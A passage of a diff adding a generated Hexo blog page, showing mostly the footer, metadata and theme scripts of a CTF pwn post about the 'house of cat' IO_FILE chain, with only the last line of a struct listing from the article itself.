class="hljs-number">1</span>]<br>    +<span class="hljs-number">0x00e0</span> _wide_vtable         : <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTFPWN/" class="category-chain-item">CTFPWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/knowledge/">#knowledge</a>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>IO_FILE链house_of_cat链记录</div>
+      <div>http://example.com/2025/06/27/IO-FILE链house-of-cat链记录/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>OSLike</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/10/%E4%BB%80%E4%B9%88%E5%B0%8F%E9%93%BE%E8%A1%A8/" title="什么小链表">
+                        <span class="hidden-mobile">什么小链表</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('mermaid' in window) {
+        mermaid.init();
+      }
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>OSLike</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>WEplayerscsc</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人      
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
